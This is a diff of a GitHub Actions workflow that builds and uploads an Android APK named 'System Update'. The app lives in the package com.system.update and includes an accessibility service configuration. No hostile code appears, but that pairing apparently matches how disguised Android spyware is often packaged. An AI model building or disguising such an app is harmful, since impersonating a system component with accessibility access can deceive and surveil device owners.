@@ -14,44 +14,76 @@ jobs:
         uses: actions/checkout@v4
 
       - name: Set up JDK 17
-        uses: actions/setup-java@v5
+        uses: actions/setup-java@v4
         with:
           distribution: 'temurin'
           java-version: '17'
 
       - name: Setup Android SDK
-        uses: android-actions/setup-android@v3
-
-      - name: Build with Gradle
         run: |
-          echo "sdk.dir=$ANDROID_HOME" > local.properties
-          echo "org.gradle.jvmargs=-Xmx2048m" > gradle.properties
+          export ANDROID_HOME=$HOME/android-sdk
+          mkdir -p $ANDROID_HOME/cmdline-tools
           
-          # Create project structure
+          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip -O cmdline-tools.zip
+          unzip -q cmdline-tools.zip -d $ANDROID_HOME/cmdline-tools
+          mv $ANDROID_HOME/cmdline-tools/cmdline-tools $ANDROID_HOME/cmdline-tools/latest
+          
+          export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
+          export PATH=$PATH:$ANDROID_HOME/platform-tools
+          
+          yes | sdkmanager --licenses > /dev/null 2>&1 || true
+          sdkmanager "platforms;android-34" "build-tools;34.0.0" "platform-tools" > /dev/null 2>&1
+          
+          echo "ANDROID_HOME=$ANDROID_HOME" >> $GITHUB_ENV
+          echo "$ANDROID_HOME/cmdline-tools/latest/bin" >> $GITHUB_PATH
+          echo "$ANDROID_HOME/platform-tools" >> $GITHUB_PATH
+
+      - name: Create Project Structure
+        run: |
           mkdir -p app/src/main/java/com/system/update
           mkdir -p app/src/main/res/xml
           mkdir -p app/src/main/res/values
           
-          # Move Java files
           find . -maxdepth 1 -name "*.java" -exec cp {} app/src/main/java/com/system/update/ \;
-          cp AndroidManifest.xml app/src/main/
-          cp accessibility_config.xml app/src/main/res/xml/
-          
-          # Create strings.xml if missing
-          if [ ! -f strings.xml ]; then
-            echo '<?xml version="1.0" encoding="utf-8"?>' > app/src/main/res/values/strings.xml
-            echo '<resources><string name="app_name">System Update</string></resources>' >> app/src/main/res/values/strings.xml
-          else
-            cp strings.xml app/src/main/res/values/
-          fi
-          
-          # Create build.gradle files
-          echo 'buildscript { repositories { google(); mavenCentral() } dependencies { classpath "com.android.tools.build:gradle:8.1.4" } }' > build.gradle
-          echo 'allprojects { repositories { google(); mavenCentral() } }' >> build.gradle
-          
-          echo 'rootProject.name = "SystemUpdate"' > settings.gradle
-          echo 'include ":app"' >> settings.gradle
-          
+          cp AndroidManifest.xml app/src/main/ 2>/dev/null || true
+          cp accessibility_config.xml app/src/main/res/xml/ 2>/dev/null || true
+
+      - name: Create Gradle Files
+        run: |
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "SystemUpdate"
+          include ':app'
+          EOF
+
+          cat > build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application' version '8.1.4' apply false
+          }
+          EOF
+
+          cat > gradle.properties << 'EOF'
+          android.useAndroidX=true
+          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+          EOF
+
+          cat > local.properties << 'EOF'
+          sdk.dir=/home/runner/android-sdk
+          EOF
+
           cat > app/build.gradle << 'EOF'
           plugins {
               id 'com.android.application'
@@ -76,14 +108,22 @@ jobs:
                   targetCompatibility JavaVersion.VERSION_17
               }
           }
+          dependencies {
+          }
           EOF
-          
-          # Create gradle wrapper
-          gradle wrapper --gradle-version 8.1.4
-          chmod +x gradlew
-          
-          # Build APK
-          ./gradlew assembleDebug --stacktrace
+
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">System Update</string>
+          </resources>
+          EOF
+
+      - name: Setup Gradle
+        uses: gradle/gradle-build-action@v3
+
+      - name: Build APK
+        run: gradle assembleDebug --no-daemon
 
       - name: Upload APK
         if: success()
